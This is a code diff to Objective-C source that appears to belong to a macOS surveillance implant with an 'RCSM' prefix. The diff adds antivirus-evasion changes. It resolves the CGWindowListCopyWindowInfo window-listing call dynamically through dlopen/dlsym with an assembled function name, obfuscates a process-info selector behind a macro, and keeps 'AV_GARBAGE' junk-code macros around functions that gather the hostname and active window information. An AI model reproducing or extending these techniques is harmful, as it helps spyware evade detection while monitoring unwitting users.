@@ -13,6 +13,8 @@
 #import <IOKit/IOKitLib.h>
 #import <CoreAudio/CoreAudio.h>
 #import <CoreFoundation/CoreFoundation.h>
+#import <CommonCrypto/CommonDigest.h>
+#import <CommonCrypto/CommonCryptor.h>
 
 #import <mach/machine.h>
 #import <mach-o/loader.h>
@@ -26,7 +28,12 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#import "NSProcessInfo+NSProcessInfo__AVEvasion_.h"
 #include "RCSMAVGarbage.h"
+
+#include <dlfcn.h>
+
+CFArrayRef (*pCGWindowListCopyWindowInfo)(CGWindowListOption, CGWindowID) = NULL;
 
 //// Remember to md5 this
 //#ifndef DEV_MODE
@@ -458,7 +465,7 @@ NSString *getHostname()
   // AV evasion: only on release build
   AV_GARBAGE_005
   
-  NSProcessInfo *processInfo = [NSProcessInfo processInfo];
+  NSProcessInfo *processInfo = [NSProcessInfo PROCESSINFO_SEL];
   NSString *hostName = [processInfo hostName];
 
   return hostName;
@@ -1198,6 +1205,22 @@ size_t _utf16len(unichar *string)
   return len;
 }
 
+void *resolveQuartzFunc()
+{
+  void *handle = dlopen("/System/Library/Frameworks/CoreGraphics.framework/Versions/Current/CoreGraphics", 2);
+  
+  if (handle == NULL)
+    return NULL;
+  
+  char funcName[256];
+  
+  sprintf(funcName, "CGWindowList%s%s","Copy", "WindowInfo");
+  
+  pCGWindowListCopyWindowInfo = dlsym(handle, funcName);
+  
+  return pCGWindowListCopyWindowInfo;
+}
+
 NSDictionary *getActiveWindowInfo()
 {  
   // AV evasion: only on release build
@@ -1234,7 +1257,7 @@ NSDictionary *getActiveWindowInfo()
   AV_GARBAGE_002
   
   // Window list front to back
-  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
+  windowsList = pCGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
                                            kCGNullWindowID);
   
   if (windowsList == NULL)
